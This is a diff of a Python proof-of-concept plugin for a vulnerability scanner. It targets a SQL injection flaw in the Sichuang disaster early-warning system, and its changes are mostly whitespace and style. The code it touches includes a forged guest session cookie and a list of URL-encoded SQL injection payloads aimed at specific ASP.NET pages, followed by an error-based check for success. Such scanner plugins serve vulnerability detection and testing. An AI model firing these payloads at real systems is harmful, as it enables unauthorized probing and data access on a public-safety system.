@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'StrongSoft_0002' # 平台漏洞编号，留空
+    vuln_id = 'StrongSoft_0002'  # 平台漏洞编号，留空
     name = '四创灾害预警系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-20'  # 漏洞公布时间
     desc = '''
         四创灾害预警系统
@@ -25,6 +26,7 @@ class Vuln(ABVuln):
     product = '四创灾害预警系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'f48c7203-31aa-4cc1-b9d3-944a4aab2984'
     author = '47bwy'  # POC编写者
@@ -37,13 +39,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0108828
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0108604
-            hh =hackhttp.hackhttp()
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108828
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108604
+            hh = hackhttp.hackhttp()
             host = urlparse.urlparse(self.target).hostname
-            cookie = 'ASP.NET_SessionId=dlsnv245vsnx1s45vhajsx45; UserId' + host + '=guest' 
-            payloads=[
+            cookie = 'ASP.NET_SessionId=dlsnv245vsnx1s45vhajsx45; UserId' + host + '=guest'
+            payloads = [
                 '/DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name%281%29%3E1--',
                 '/DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name(1)%3E1--',
                 '/SystemManage/SysGeneral/SysGeneralShow.aspx?MenuId=1%20and%20db_name%281%29%3E1--',
@@ -54,7 +56,7 @@ class Poc(ABPoc):
                 url = self.target + payload
                 code, head, res, errcode, _ = hh.http(url, cookie=cookie)
 
-                if code == 500 and 'master' in res or 'qqpjq1qqvvq' in res :
+                if code == 500 and 'master' in res or 'qqpjq1qqvvq' in res:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -63,6 +65,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
